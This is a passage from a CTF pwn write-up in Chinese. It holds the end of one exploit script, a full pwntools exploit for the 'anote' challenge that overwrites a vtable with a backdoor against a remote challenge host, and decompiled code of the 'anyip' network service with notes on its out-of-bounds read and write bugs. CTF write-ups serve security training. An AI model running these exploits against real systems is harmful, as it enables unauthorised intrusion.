1)</span></span><br><span class="line">add(<span class="number">0x1C</span>, <span class="number">0x10</span>, <span class="number">0x1E</span>)</span><br><span class="line">mov(<span class="number">0x1C</span>, <span class="number">0</span>, <span class="number">0x118</span>)  <span class="comment"># ret + 0x0</span></span><br><span class="line">add(<span class="number">0x1C</span>, <span class="number">0x1C</span>, <span class="number">1</span>)</span><br><span class="line">mov(<span class="number">0x1C</span>, <span class="number">0</span>, <span class="number">0x128</span>)  <span class="comment"># ret + 0x0</span></span><br><span class="line"></span><br><span class="line">sub(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0x1E</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cal(<span class="number">0x26FE0</span>):</span><br><span class="line">    sub(<span class="number">0x1D</span>, <span class="number">0x1D</span>, <span class="number">0x1D</span>)</span><br><span class="line">    add(<span class="number">0x1D</span>, i, <span class="number">0x1D</span>)</span><br><span class="line">    add(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">1</span>)</span><br><span class="line">    shl(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x1E, 0x1E, 1)</span></span><br><span class="line">add(<span class="number">0x1C</span>, <span class="number">0x10</span>, <span class="number">0x1E</span>)</span><br><span class="line">mov(<span class="number">0x1C</span>, <span class="number">0</span>, <span class="number">0x130</span>)  <span class="comment"># ret + 0x10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sub(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0x1E</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cal(<span class="number">0x1AE8E8</span>):</span><br><span class="line">    sub(<span class="number">0x1D</span>, <span class="number">0x1D</span>, <span class="number">0x1D</span>)</span><br><span class="line">    add(<span class="number">0x1D</span>, i, <span class="number">0x1D</span>)</span><br><span class="line">    add(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">1</span>)</span><br><span class="line">    shl(<span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0x1D</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(0x1E, 0x1E, 1)</span></span><br><span class="line">add(<span class="number">0x1C</span>, <span class="number">0x10</span>, <span class="number">0x1E</span>)</span><br><span class="line">mov(<span class="number">0x1C</span>, <span class="number">0</span>, <span class="number">0x120</span>)  <span class="comment"># ret + 0x8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;opcode:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;cat /flag&#x27;</span>)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h2><p>非常简单的越界菜单题，show拿到堆地址，修改虚表为后门即可</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;47.94.95.135 32829&#x27;</span></span><br><span class="line">    host = addr.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    gift.io = remote(host[<span class="number">0</span>], host[<span class="number">1</span>])</span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x86_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">gift.elf = ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;Choice&gt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;len&#x27;</span>, <span class="built_in">str</span>(<span class="number">32</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">gift = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) + <span class="number">8</span></span><br><span class="line">log_address_ex2(gift)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p32_ex(<span class="number">0x80489CE</span>) * <span class="number">4</span>)</span><br><span class="line">edit(-<span class="number">8</span>, p32_ex(gift))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

<h2 id="anyip"><a href="#anyip" class="headerlink" title="anyip"></a>anyip</h2><p>比赛时一直卡在二叉树的构建上，比赛后发现就是个中序遍历生成二叉树罢了，唉，太菜了</p>
<p>如果我是二叉树之神的话……………………</p>
<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>程序开放了9999端口，需要发送特定格式的数据</p>
<p>首先检验了几个byte位</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_3948</span><span class="params">(struct_v4 *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE5(a1-&gt;qword8) == <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( BYTE4(a1-&gt;qword8) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sub_39B8(a2, (__int64)a1, <span class="number">129</span>, <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_39B8(a2, (__int64)a1, <span class="number">129</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后，前4字节是op位，根据op进行不同的操作</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">sub_3424</span><span class="params">(struct_v4 *a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> op_low; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  op_low = LOWORD(a1-&gt;op);</span><br><span class="line">  <span class="keyword">if</span> ( op_low == <span class="string">&#x27;DD&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_3248(BYTE3(a1-&gt;op), (<span class="type">const</span> <span class="type">char</span> *)a1-&gt;buf);<span class="comment">// queue</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( LOWORD(a1-&gt;op) &lt;= <span class="number">0x4444</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( op_low == <span class="number">0x3333</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_2969(BYTE3(a1-&gt;op), a1-&gt;buf, *(_QWORD *)&amp;a1-&gt;len);<span class="comment">// tree</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( LOWORD(a1-&gt;op) &lt;= <span class="number">0x3333</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( op_low == <span class="number">0x1111</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_2D03(a2, a1);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( op_low == <span class="number">0x2222</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_3108(BYTE3(a1-&gt;op), a1-&gt;buf, *(_QWORD *)&amp;a1-&gt;len);<span class="comment">// stack</span></span><br><span class="line">        <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_39B8(a2, (__int64)a1, <span class="number">129</span>, <span class="number">3</span>);</span><br><span class="line">LABEL_12:</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> sub_39B8(a2, (__int64)a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sub_39B8(a2, (__int64)a1, <span class="number">129</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>0x1111</code>是打印log，更新log</p>
<p><code>0x2222</code>是一个stack</p>
<p><code>0x3333</code>是一个二叉树</p>
<p><code>0x4444</code>是一个queue</p>
<p>首先看stack</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_3108</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v6[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( stack2_ptr - dword_90CC == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = atoi(a2);</span><br><span class="line">      v3 = stack2_ptr++;</span><br><span class="line">      stack2[v3] = v2;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    int2str(v6, stack2[--stack2_ptr]);</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(v6);</span><br><span class="line">    <span class="built_in">log</span>(v4);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>就一个<code>pop</code>和一个<code>push</code>，其中对位置的判断只有<code>if ( stack2_ptr - dword_90CC == 10 )</code>这一条，因此有越界的读写</p>
<p>再看到queue</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_3248</span><span class="params">(<span class="type">int</span> a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+2Ch] [rbp-44h]</span></span><br><span class="line">  _BYTE v6[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = atoi(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (stack4_head + <span class="number">1</span>) % <span class="number">10</span> == stack4_tail )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      stack4[stack4_head] = v4;</span><br><span class="line">      stack4_head = (stack4_head + <span class="number">1</span>) % <span class="number">10</span>;     <span class="comment">// store int</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( stack4_tail == stack4_head )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = stack4[stack4_tail];</span><br><span class="line">      stack4_tail = (stack4_tail + <span class="number">1</span>) % <span class="number">10</span>;</span><br><span class="line">      int2str(v6, v5);</span><br><span class="line">      v2 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(v6);</span><br><span class="line">      <span class="built_in">log</span>(v2);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v6);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也是有简单的<code>dequeue</code>和<code>enqueue</code></p>
<p>同样，对head的判断只有<code>if ( (stack4_head + 1) % 10 == stack4_tail )</code>，也是任意写</p>
<p>最后看到二叉树</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_2969</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+27h] [rbp-E9h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *node; <span class="comment">// [rsp+28h] [rbp-E8h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">80</span>]; <span class="comment">// [rsp+30h] [rbp-E0h] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">80</span>]; <span class="comment">// [rsp+80h] [rbp-90h] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">40</span>]; <span class="comment">// [rsp+D0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+F8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_41A6(v9);                                 <span class="comment">// queue</span></span><br><span class="line">  sub_42AC(v10);</span><br><span class="line">  node = (<span class="type">char</span> *)tree;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v7);</span><br><span class="line">  sub_431E(v11, &amp;unk_6008, &amp;v7);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v7);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    tree = (__int64)new_tree(*a2);</span><br><span class="line">    v3 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_43E2((__int64)v9, (__int64)&amp;node);</span><br><span class="line">      <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int8)sub_440C((__int64)v9) != <span class="number">1</span> )<span class="comment">// is_empty</span></span><br><span class="line">      &#123;</span><br><span class="line">        node = *(<span class="type">char</span> **)sub_442A(v9);          <span class="comment">// dequeue</span></span><br><span class="line">        <span class="keyword">if</span> ( !*((_QWORD *)node + <span class="number">1</span>) || !*((_QWORD *)node + <span class="number">2</span>) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        sub_43E2((__int64)v9, (__int64)(node + <span class="number">8</span>));<span class="comment">// enqueue</span></span><br><span class="line">        sub_43E2((__int64)v9, (__int64)(node + <span class="number">16</span>));</span><br><span class="line">        sub_4448((__int64)v9);                  <span class="comment">// pop</span></span><br><span class="line">      &#125;</span><br><span class="line">      v2 = node;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)node + <span class="number">1</span>) )</span><br><span class="line">        *((_QWORD *)v2 + <span class="number">2</span>) = new_tree(*a2);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *((_QWORD *)v2 + <span class="number">1</span>) = new_tree(*a2);</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">      <span class="keyword">while</span> ( node || (<span class="type">unsigned</span> __int8)sub_4468((__int64)v10) != <span class="number">1</span> )<span class="comment">// is_empty</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( node )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_4486(v10, &amp;node);</span><br><span class="line">          node = (<span class="type">char</span> *)*((_QWORD *)node + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          node = *(<span class="type">char</span> **)sub_44B0((__int64)v10);<span class="comment">// pop</span></span><br><span class="line">          <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(v11, (<span class="type">unsigned</span> <span class="type">int</span>)*node);</span><br><span class="line">          sub_44CE(v10);                        <span class="comment">// pop</span></span><br><span class="line">          node = (<span class="type">char</span> *)*((_QWORD *)node + <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v5 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(v11);</span><br><span class="line">      <span class="built_in">log</span>(v5);</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_26:</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v11);</span><br><span class="line">  sub_3F48(v10);</span><br><span class="line">  sub_3F28(v9);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>有一个初始化，一个<code>insert</code>和一个遍历</p>
<p>这里上面的<code>v9</code>是queue，<code>v10</code>是stack</p>
<p>所以对应的，<code>insert</code>是层序插入，遍历输出是中序输出（参考非递归实现的中序遍历）</p>
<p><code>0x1111</code>是log相关的功能</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_2D03</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+14h] [rbp-46Ch]</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+18h] [rbp-468h] BYREF</span></span><br><span class="line">  _QWORD v11[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-460h] BYREF</span></span><br><span class="line">  _BYTE v12[<span class="number">80</span>]; <span class="comment">// [rsp+40h] [rbp-440h] BYREF</span></span><br><span class="line">  _BYTE v13[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-3F0h] BYREF</span></span><br><span class="line">  _BYTE v14[<span class="number">32</span>]; <span class="comment">// [rsp+B0h] [rbp-3D0h] BYREF</span></span><br><span class="line">  _BYTE v15[<span class="number">16</span>]; <span class="comment">// [rsp+D0h] [rbp-3B0h] BYREF</span></span><br><span class="line">  __int64 v16; <span class="comment">// [rsp+E0h] [rbp-3A0h] BYREF</span></span><br><span class="line">  _BYTE v17[<span class="number">520</span>]; <span class="comment">// [rsp+260h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v18; <span class="comment">// [rsp+468h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v18 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v9 = *(<span class="type">unsigned</span> __int8 *)(a2 + <span class="number">3</span>);</span><br><span class="line">  v2 = *(_QWORD *)(a2 + <span class="number">24</span>);</span><br><span class="line">  v11[<span class="number">2</span>] = *(_QWORD *)(a2 + <span class="number">16</span>);</span><br><span class="line">  v11[<span class="number">3</span>] = v2;</span><br><span class="line">  <span class="built_in">std</span>::ifstream::basic_ifstream(v17);</span><br><span class="line">  sub_42AC(v12);</span><br><span class="line">  v11[<span class="number">0</span>] = tree;</span><br><span class="line">  v11[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;timer);</span><br><span class="line">  sub_431E(v13, &amp;unk_6008, &amp;timer);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;timer);</span><br><span class="line">  <span class="built_in">std</span>::basic_stringstream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_stringstream(v15);</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    time(&amp;timer);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld.log&quot;</span>, timer);</span><br><span class="line">    <span class="built_in">log</span>(<span class="string">&quot;----- log -----&quot;</span>);</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v9 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v11[<span class="number">0</span>] || (<span class="type">unsigned</span> __int8)sub_4468(v12) != <span class="number">1</span> )<span class="comment">// is_empty</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v11[<span class="number">0</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4486(v12, v11);                     <span class="comment">// stack</span></span><br><span class="line">        v11[<span class="number">0</span>] = *(_QWORD *)(v11[<span class="number">0</span>] + <span class="number">8LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v11[<span class="number">0</span>] = *(_QWORD *)sub_44B0(v12);      <span class="comment">// pop</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">string</span>::operator+=(v13, (<span class="type">unsigned</span> <span class="type">int</span>)*(<span class="type">char</span> *)v11[<span class="number">0</span>]);</span><br><span class="line">        sub_44CE(v12);                          <span class="comment">// pop</span></span><br><span class="line">        v11[<span class="number">0</span>] = *(_QWORD *)(v11[<span class="number">0</span>] + <span class="number">16LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">std</span>::<span class="built_in">string</span>::compare(v13, <span class="string">&quot;SomeIpfun&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::ifstream::open(v17, s, <span class="number">8LL</span>);</span><br><span class="line">      v4 = <span class="built_in">std</span>::ifstream::rdbuf(v17);</span><br><span class="line">      <span class="built_in">std</span>::ostream::operator&lt;&lt;(&amp;v16, v4);</span><br><span class="line">      <span class="built_in">std</span>::basic_stringstream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::str(v14, v15);</span><br><span class="line">      <span class="built_in">std</span>::ifstream::close(v17);</span><br><span class="line">      v5 = <span class="built_in">std</span>::<span class="built_in">string</span>::length(v14);</span><br><span class="line">      v6 = <span class="built_in">std</span>::<span class="built_in">string</span>::c_str(v14);</span><br><span class="line">      sub_3A75(a1, a2, v6, v5);</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v14);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::basic_stringstream&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::~basic_stringstream(v15);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v13);</span><br><span class="line">  sub_3F48(v12);</span><br><span class="line">  <span class="built_in">std</span>::ifstream::~ifstream(v17);</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>op1是更新log文件名</p>
